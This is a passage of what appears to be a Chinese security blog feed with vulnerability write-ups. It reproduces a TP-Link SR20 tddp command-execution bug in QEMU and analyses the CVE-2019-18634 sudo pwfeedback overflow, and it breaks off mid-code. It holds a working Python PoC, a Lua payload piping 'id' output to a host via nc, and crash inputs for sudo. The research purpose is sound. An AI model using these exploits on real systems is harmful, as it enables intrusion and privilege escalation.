bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">USE_INETD=<span class="literal">false</span> <span class="comment">#改成false</span></span><br><span class="line">OPTIONS=<span class="string">"--tftpd-timeout 300 --retry-timeout 5 --mcast-port 1758 --mcast-addr 239.239.239.0-255 --mcast-ttl 1 --maxthread 100 --verbose=5 /opt/ftp"</span></span><br><span class="line"><span class="comment">#改下后面的地址</span></span><br><span class="line"></span><br><span class="line">sudo mkdir /opt/ftp</span><br><span class="line">sudo chmod 777 /opt/ftp</span><br><span class="line"><span class="comment">#之后 ftp传文件就从这个目录传，这个默认为传文件的根目录</span></span><br><span class="line">sudo systemctl start atftpd</span><br><span class="line">sudo systemctl status atftpd <span class="comment">#这个查看下状态 状态要像下面这样，不然就是失败的</span></span><br></pre></td></tr></table></figure><p><img src="/images/image-20200803173548905.png" alt="image-20200803173548905"></p><p>然后在ftp的目录下面新建一个文件，用以给 tddp 通过tftp 读取并执行</p><p>文件的内容大概如下</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">config_test</span><span class="params">(config)</span></span></span><br><span class="line">  <span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">"id | nc  192.168.2.1 9999"</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>然后用qemu把环境起起来</p><p>先把 <code>squashfs-root</code> 目录打包好，然后用 python -m SimpleHTTPServer 传进虚拟机</p><p>想传还得把qemu虚拟机和本地虚拟机搭建一个局域网网络</p><p>然后就建立网卡</p><p>本地虚拟机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo tunctl -t tap0 -u `whoami`</span><br><span class="line">sudo ifconfig tap0 192.168.2.1/24</span><br></pre></td></tr></table></figure><p>启动qemu虚拟机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-arm -M versatilepb -kernel vmlinuz-3.2.0-4-versatile -initrd initrd.img-3.2.0-4-versatile -hda debian_wheezy_armel_standard.qcow2 -append <span class="string">"root=/dev/sda1"</span>  -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span><br><span class="line"></span><br><span class="line">sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive <span class="keyword">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 -append <span class="string">"root=/dev/mmcblk0p2"</span> -net nic -net tap -nographic</span><br></pre></td></tr></table></figure><p>两个都可以，一个 <code>hard floting</code>,另一个是<code>soft floting</code>  在armhf 的效率高，但要硬件支持</p><p>具体的区别看这个链接：<a href="https://stackoverflow.com/questions/3321468/whats-the-difference-between-hard-and-soft-floating-point-numbers" target="_blank" rel="noopener">区别</a> <a href="https://blog.csdn.net/yuanlu837/article/details/12502313" target="_blank" rel="noopener">区别</a></p><p>进入qemu虚拟机，账号密码都是 root</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 192.168.2.2/24 <span class="comment"># 配置网卡</span></span><br><span class="line">wget http://ip:port/filename</span><br><span class="line"><span class="comment">#下载文件</span></span><br><span class="line">sudo mount -o <span class="built_in">bind</span> /dev ./squashfs-root/dev <span class="comment">#将固件文件系统下的dev目录挂载到虚拟机/dev</span></span><br><span class="line">sudo mount -t proc /proc ./squashfs-root/proc <span class="comment">#将固件文件系统下的proc目录挂载到虚拟机/proc</span></span><br><span class="line">挂载文件，然后用chroot起</span><br><span class="line">chroot . sh</span><br></pre></td></tr></table></figure><p>环境好了，就开始复现了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#qemu 虚拟机</span><br><span class="line">#先运行tddp</span><br><span class="line">./usr/bin/tddp</span><br><span class="line"># 运行nc 监听本地端口，因为执行 lua脚本会返回一个请求</span><br><span class="line">nc -lvnp  9999</span><br></pre></td></tr></table></figure><p>运行poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Copyright 2019 Google LLC.</span></span><br><span class="line"><span class="comment"># SPDX-License-Identifier: Apache-2.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a file in your tftp directory with the following contents:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#function config_test(config)</span></span><br><span class="line"><span class="comment">#  os.execute("telnetd -l /bin/login.sh")</span></span><br><span class="line"><span class="comment">#end</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Execute script as poc.py remoteaddr filename</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">port_send = <span class="number">1040</span></span><br><span class="line">port_receive = <span class="number">61000</span></span><br><span class="line"></span><br><span class="line">tddp_ver = <span class="string">"01"</span></span><br><span class="line">tddp_command = <span class="string">"31"</span></span><br><span class="line">tddp_req = <span class="string">"01"</span></span><br><span class="line">tddp_reply = <span class="string">"00"</span></span><br><span class="line">tddp_padding = <span class="string">"%0.16X"</span> % <span class="number">00</span></span><br><span class="line"></span><br><span class="line">tddp_packet = <span class="string">""</span>.join([tddp_ver, tddp_command, tddp_req, tddp_reply, tddp_padding])</span><br><span class="line"></span><br><span class="line">sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">sock_receive.bind((<span class="string">''</span>, port_receive))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Send a request</span></span><br><span class="line">sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">packet = binascii.unhexlify(tddp_packet)</span><br><span class="line">argument = <span class="string">"%s;arbitrary"</span> % sys.argv[<span class="number">2</span>]</span><br><span class="line">packet = packet + argument.encode()</span><br><span class="line">sock_send.sendto(packet, (sys.argv[<span class="number">1</span>], port_send))</span><br><span class="line">sock_send.close()</span><br><span class="line"></span><br><span class="line">response, addr = sock_receive.recvfrom(<span class="number">1024</span>)</span><br><span class="line">r = response.encode(<span class="string">'hex'</span>)</span><br><span class="line">print(r)</span><br></pre></td></tr></table></figure><p><img src="/images/image-20200803175414831.png" alt="image-20200803175414831"></p><p>然后</p><p><img src="/images/image-20200803175436714.png" alt="image-20200803175436714"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>poc的利用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub_971C() -&gt; sub_936C() -&gt; sub_16418() -&gt; sub_15E74() -&gt; sub_A580() -&gt; sub_91DC()</span><br><span class="line">-&gt; execve(&quot;/bin/sh&quot;, &amp;argv, 0);</span><br></pre></td></tr></table></figure><p><img src="/images/image-20200804092740755.png" alt="image-20200804092740755"></p><p><img src="/images/image-20200804092832845.png" alt="image-20200804092832845"></p><p><img src="/images/image-20200804092905412.png" alt="image-20200804092905412"></p><p>第二个字节</p><p><img src="/images/image-20200804092925430.png" alt="image-20200804092925430"></p><p><img src="/images/image-20200804092950282.png" alt="image-20200804092950282"></p><p>从参数上就能看道是通过tftp来执行命令</p><p><img src="/images/image-20200804093025453.png" alt="image-20200804093025453"></p><p>参考链接</p><p><a href="https://mjg59.dreamwidth.org/51672.html" target="_blank" rel="noopener">挖洞的作者</a></p><p><a href="https://ray-cp.github.io/archivers/tp_link_sr20_ace" target="_blank" rel="noopener">raycp</a></p><p><a href="https://paper.seebug.org/879/" target="_blank" rel="noopener">404dalao</a></p>]]></content>
    
    <summary type="html">
    
      &lt;center&gt;&lt;font size=&quot;5&quot;&gt;info&lt;/font&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="PWN" scheme="https://leave-Devour.github.io/categories/PWN/"/>
    
    
      <category term="IOT" scheme="https://leave-Devour.github.io/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-18634分析</title>
    <link href="https://leave-devour.github.io/2020/07/17/CVE-2019-18634%E5%88%86%E6%9E%90/"/>
    <id>https://leave-devour.github.io/2020/07/17/CVE-2019-18634%E5%88%86%E6%9E%90/</id>
    <published>2020-07-17T14:04:13.000Z</published>
    <updated>2020-07-17T14:06:07.751Z</updated>
    
    <content type="html"><![CDATA[<center><font size="5">info</font></center><a id="more"></a><h3 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.sudo.ws/dist/sudo-1.8.25.tar.gz</span><br><span class="line">tar -zxvf ./sudo-1.8.25.tar.gz</span><br><span class="line"><span class="built_in">cd</span> ./sudo-1.8.25</span><br><span class="line">./configure</span><br><span class="line">make  or  make -j4</span><br><span class="line">make install</span><br><span class="line">安装之后看看 是否与系统的sudo冲突了可以查看zshrc或者bashrc 然后调整环境变量的顺序</span><br><span class="line">系统的在/usr/bin/下面，而自己编译安装的在 /usr/<span class="built_in">local</span>/bin/下面</span><br><span class="line">开启 pwfeedback选项（这个就是一个密码反馈，能看出输入多少位）</span><br><span class="line">在 /etc/sudoers 加一行 Defaults pwfeedback</span><br></pre></td></tr></table></figure><p><code>./configure</code> 的时候可以开 <code>--enable-asan</code></p><p>这样调试 poc的时候，能够很好的地位到漏洞点</p><p>比如:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">└─[0] &lt;&gt; <span class="built_in">source</span> ~/.zshrc  </span><br><span class="line">┌─[yezi@ubuntu] - [~/Desktop/CVE-2019-18634/sudo-1.8.25] - [2020-07-15 10:22:53]</span><br><span class="line">└─[0] &lt;&gt; perl -e <span class="string">'print(("A" x 100 . "\x&#123;00&#125;") x 50)'</span> | sudo -S id</span><br><span class="line"></span><br><span class="line">We trust you have received the usual lecture from the <span class="built_in">local</span> System</span><br><span class="line">Administrator. It usually boils down to these three things:</span><br><span class="line"></span><br><span class="line">    <span class="comment">#1) Respect the privacy of others.</span></span><br><span class="line">    <span class="comment">#2) Think before you type.</span></span><br><span class="line">    <span class="comment">#3) With great power comes great responsibility.</span></span><br><span class="line"></span><br><span class="line">Password: =================================================================</span><br><span class="line">==27875==ERROR: AddressSanitizer: global-buffer-overflow on address 0x5616203d90a0 at pc 0x561620174885 bp 0x7ffe80907a00 sp 0x7ffe809079f0</span><br><span class="line">WRITE of size 1 at 0x5616203d90a0 thread T0</span><br><span class="line">    <span class="comment">#0 0x561620174884 in getln tgetpass.c:345</span></span><br><span class="line">    <span class="comment">#1 0x5616201750cd in tgetpass tgetpass.c:178</span></span><br><span class="line">    <span class="comment">#2 0x561620144f16 in sudo_conversation conversation.c:72</span></span><br><span class="line">    <span class="comment">#3 0x7fa57f23c2ae in auth_getpass auth/sudo_auth.c:457</span></span><br><span class="line">    <span class="comment">#4 0x7fa57f23cb91 in verify_user auth/sudo_auth.c:312</span></span><br><span class="line">    <span class="comment">#5 0x7fa57f23edb9 in check_user_interactive check.c:148</span></span><br><span class="line">    <span class="comment">#6 0x7fa57f23edb9 in check_user check.c:218</span></span><br><span class="line">    <span class="comment">#7 0x7fa57f2878ba in sudoers_policy_main sudoers.c:382</span></span><br><span class="line">    <span class="comment">#8 0x7fa57f267efd in sudoers_policy_check policy.c:861</span></span><br><span class="line">    <span class="comment">#9 0x5616201402b4 in policy_check sudo.c:1158</span></span><br><span class="line">    <span class="comment">#10 0x5616201402b4 in main sudo.c:245</span></span><br><span class="line">    <span class="comment">#11 0x7fa58321883f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line">    <span class="comment">#12 0x561620144ad8 in _start (/usr/local/bin/sudo+0x4cad8)</span></span><br><span class="line"></span><br><span class="line">0x5616203d90a0 is located 32 bytes to the left of global variable <span class="string">'askpass'</span> defined <span class="keyword">in</span> <span class="string">'./tgetpass.c:90:24'</span> (0x5616203d90c0) of size 8</span><br><span class="line">0x5616203d90a0 is located 0 bytes to the right of global variable <span class="string">'buf'</span> defined <span class="keyword">in</span> <span class="string">'./tgetpass.c:91:17'</span> (0x5616203d8fa0) of size 256</span><br><span class="line">SUMMARY: AddressSanitizer: global-buffer-overflow tgetpass.c:345 <span class="built_in">getln</span></span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  0x0ac3440731c0: 04 f9 f9 f9 f9 f9 f9 f9 00 f9 f9 f9 f9 f9 f9 f9</span><br><span class="line">  0x0ac3440731d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x0ac3440731e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x0ac3440731f0: f9 f9 f9 f9 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x0ac344073200: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">=&gt;0x0ac344073210: 00 00 00 00[f9]f9 f9 f9 00 f9 f9 f9 f9 f9 f9 f9</span><br><span class="line">  0x0ac344073220: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x0ac344073230: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x0ac344073240: 04 f9 f9 f9 f9 f9 f9 f9 00 00 00 00 00 00 00 00</span><br><span class="line">  0x0ac344073250: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x0ac344073260: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">Shadow byte legend (one shadow byte represents 8 application bytes):</span><br><span class="line">  Addressable:           00</span><br><span class="line">  Partially addressable: 01 02 03 04 05 06 07 </span><br><span class="line">  Heap left redzone:       fa</span><br><span class="line">  Heap right redzone:      fb</span><br><span class="line">  Freed heap region:       fd</span><br><span class="line">  Stack left redzone:      f1</span><br><span class="line">  Stack mid redzone:       f2</span><br><span class="line">  Stack right redzone:     f3</span><br><span class="line">  Stack partial redzone:   f4</span><br><span class="line">  Stack after <span class="built_in">return</span>:      f5</span><br><span class="line">  Stack use after scope:   f8</span><br><span class="line">  Global redzone:          f9</span><br><span class="line">  Global init order:       f6</span><br><span class="line">  Poisoned by user:        f7</span><br><span class="line">  Container overflow:      <span class="built_in">fc</span></span><br><span class="line">  Array cookie:            ac</span><br><span class="line">  Intra object redzone:    bb</span><br><span class="line">  ASan internal:           fe</span><br><span class="line">==27875==ABORTING</span><br></pre></td></tr></table></figure><p>在大多数情况下能够很好的检测到漏洞发生位置的附近，而且还打印出栈帧情况，能够追溯回去。然后一般的溢出，uaf都能给出来。</p><p>现在网上流传的主要的两个poc就是下面两个</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、</span><br><span class="line">perl -e <span class="string">'print(("A" x 100 . "\x&#123;00&#125;") x 50)'</span> | sudo -S id</span><br><span class="line"></span><br><span class="line">2、</span><br><span class="line">socat pty,link=/tmp/pty,waitslave <span class="built_in">exec</span>:<span class="string">"perl -e 'print((\"A\" x 100 . chr(0x15)) x 50)'"</span> &amp;</span><br><span class="line">sudo -S id &lt; /tmp/pty</span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>1、首先先定位漏洞点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *</span><br><span class="line">getln(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf, <span class="keyword">size_t</span> bufsiz, <span class="keyword">int</span> feedback)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">size_t</span> left = bufsiz;</span><br><span class="line">    <span class="keyword">ssize_t</span> nr = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">char</span> *cp = buf;<span class="comment">// cp感觉就是另一个缓冲区，用来保存密码的</span></span><br><span class="line">    <span class="keyword">char</span> c = <span class="string">'\0'</span>;</span><br><span class="line">    debug_decl(getln, SUDO_DEBUG_CONV)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (left == <span class="number">0</span>) &#123;</span><br><span class="line">errno = EINVAL;</span><br><span class="line">debug_return_str(<span class="literal">NULL</span>);<span class="comment">/* sanity */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (--left) &#123; <span class="comment">//读一个少一个</span></span><br><span class="line">nr = read(fd, &amp;c, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (nr != <span class="number">1</span> || c == <span class="string">'\n'</span> || c == <span class="string">'\r'</span>)</span><br><span class="line">    <span class="keyword">break</span>;<span class="comment">//换行之类的</span></span><br><span class="line"><span class="keyword">if</span> (feedback) &#123;</span><br><span class="line">    <span class="keyword">if</span> (c == sudo_term_kill) &#123;</span><br><span class="line"><span class="keyword">while</span> (cp &gt; buf) &#123; <span class="comment">//这里会触发我觉得是  sudo_term_kill的时候而且密码也读到了</span></span><br><span class="line">    <span class="keyword">if</span> (write(fd, <span class="string">"\b \b"</span>, <span class="number">3</span>) == <span class="number">-1</span>)<span class="comment">//这里会触发因为是单向的管道</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">    --cp;</span><br><span class="line">&#125;</span><br><span class="line">left = bufsiz; <span class="comment">//溢出</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == sudo_term_erase) &#123;</span><br><span class="line"><span class="keyword">if</span> (cp &gt; buf) &#123;</span><br><span class="line">    <span class="keyword">if</span> (write(fd, <span class="string">"\b \b"</span>, <span class="number">3</span>) == <span class="number">-1</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">    --cp;</span><br><span class="line">    left++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ignore_result(write(fd, <span class="string">"*"</span>, <span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line">*cp++ = c;<span class="comment">//溢出</span></span><br><span class="line">    &#125;</span><br><span class="line">    *cp = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">if</span> (feedback) &#123;</span><br><span class="line"><span class="comment">/* erase stars */</span></span><br><span class="line"><span class="keyword">while</span> (cp &gt; buf) &#123;</span><br><span class="line">    <span class="keyword">if</span> (write(fd, <span class="string">"\b \b"</span>, <span class="number">3</span>) == <span class="number">-1</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">    --cp;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    debug_return_str_masked(nr == <span class="number">1</span> ? buf : <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">pass = getln(input, buf, <span class="keyword">sizeof</span>(buf), ISSET(flags, TGP_MASK));</span><br></pre></td></tr></table></figure><p>触发漏洞的流程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getIn() -&gt; left!=0 -&gt; feedback==True -&gt; c == sudo_term_kil</span><br></pre></td></tr></table></figure><p>满足上面的这些，就差不多可以溢出了</p><p>下面这个是漏洞产生的原因</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write(fd, &quot;\b \b&quot;, 3) == -1</span><br></pre></td></tr></table></figure><p>为什么write fd 的时候 会出现返回 -1的情况呢? </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">（这个问题困扰了我好久，调试和找了一天，最后只能得出 标准输入 0 关掉了，但是找不到关掉了系统调用，但是我已经定位到main函数最开始了,但是还是往 0写不东西）</span><br><span class="line">fd is not a valid file descriptor or is not open for writing</span><br><span class="line">write(fd, &quot;\b \b&quot;, 3) == -1  </span><br><span class="line">这个 fd的值就是 0 ，网上说是写管道去了，因为管道是单向的所以报错了，这个我没找到，，但是我测试了下，能read，但是不能write。着就让我难受了。难受。</span><br><span class="line">我只发现是关掉了，在/proc/pid/fd/下面看到的</span><br><span class="line">而且我发现 如果我不输入内容进去 就是单单调用 </span><br><span class="line">sudo -S id 这样 0 是不会关掉的.</span><br><span class="line">我猜测是 读取的时候，读取到了，就关了0，然后处理。</span><br><span class="line">感觉sudo会检测参数还是什么的。。</span><br><span class="line">难受 技术不够，调试不够清楚</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>虽然能溢出，但是 是在bss上的溢出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">static char buf[SUDO_CONV_REPL_MAX + 1];</span><br><span class="line">所以就得看 buf后面的数据是否有能够用得上的</span><br><span class="line">.bss:00000000002228E0 ; Function-local static variable</span><br><span class="line">.bss:00000000002228E0 ; char buf_6188[256]</span><br><span class="line">.bss:00000000002228E0 buf_6188        db 100h dup(?)          ; DATA XREF: tgetpass+442↑o</span><br><span class="line">.bss:00000000002229E0 ; Function-local static variable</span><br><span class="line">.bss:00000000002229E0 ; const char *askpass_6187</span><br><span class="line">.bss:00000000002229E0 askpass_6187    dq ?                    ; DATA XREF: tgetpass+69↑r</span><br><span class="line">.bss:00000000002229E0                                         ; tgetpass+8D↑r ...</span><br><span class="line">.bss:00000000002229E8                 align 20h</span><br><span class="line">.bss:0000000000222A00 ; volatile sig_atomic_t signo[65]</span><br><span class="line">.bss:0000000000222A00 signo           dd 41h dup(?)           ; DATA XREF: tgetpass_handler+5↑o</span><br><span class="line">.bss:0000000000222A00                                         ; tgetpass+21B↑o</span><br><span class="line">.bss:0000000000222B04                 public tgetpass_flags</span><br><span class="line">.bss:0000000000222B04 ; int tgetpass_flags</span><br><span class="line">.bss:0000000000222B04 tgetpass_flags  dd ?                    ; DATA XREF: sudo_conversation+5F↑r</span><br><span class="line">.bss:0000000000222B04                                         ; parse_args:loc_11E70↑w ...</span><br><span class="line">.bss:0000000000222B08                 align 20h</span><br><span class="line">.bss:0000000000222B20                 public user_details_0</span><br><span class="line">.bss:0000000000222B20 ; user_details user_details_0</span><br><span class="line">.bss:0000000000222B20 user_details_0  user_details &lt;?&gt;        ; DATA XREF: get_user_info+41↑o</span><br><span class="line">.bss:0000000000222B20                                         ; get_user_info+77↑w ...</span><br><span class="line">.bss:0000000000222B88                 public list_user</span><br><span class="line">.bss:0000000000222B88 ; const char *list_user</span><br><span class="line">.bss:0000000000222B88 list_user       dq ?                    ; DATA XREF: main+91A↑r</span><br><span class="line">.bss:0000000000222B88                                         ; parse_args:loc_11EB8↑w ...</span><br><span class="line">.bss:0000000000222B90                 align 20h</span><br></pre></td></tr></table></figure><p>先看看 askpass 这个会在下面几个地方用到</p><p><img src="/images/image-20200717213914284.png" alt="image-20200717213914284"></p><p>第一个地方:</p><p><img src="/images/image-20200717213940470.png" alt="image-20200717213940470"></p><p>第二个地方：</p><p><img src="/images/image-20200717214023517.png" alt="image-20200717214023517"></p><p>剩下几个就不列下来了，这个变量其实很关键。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *</span><br><span class="line">tgetpass(<span class="keyword">const</span> <span class="keyword">char</span> *prompt, <span class="keyword">int</span> timeout, <span 